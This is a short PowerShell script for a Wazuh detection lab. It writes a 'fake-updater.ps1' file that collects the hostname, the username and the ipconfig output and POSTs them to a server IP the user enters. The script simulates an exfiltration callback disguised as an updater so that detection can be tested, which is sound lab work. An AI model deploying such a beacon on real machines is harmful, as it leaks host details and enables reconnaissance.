# ============================================================
# Safe Wazuh Lab - Remote Login Simulation
# Server 2019 -> Windows 10
# ============================================================

@'
$ServerIP = Read-Host "Enter Server 2019 IP Address"

$Data = @"
=== Fake Updater Callback ===
Hostname: $env:COMPUTERNAME
User: $env:USERNAME
Date: $(Get-Date)

IPCONFIG:
$(ipconfig)
"@

Invoke-WebRequest `
    -Uri "http://$ServerIP`:8080/" `
    -Method POST `
    -Body $Data

'@ | Out-File C:\LabShare\fake-updater.ps1
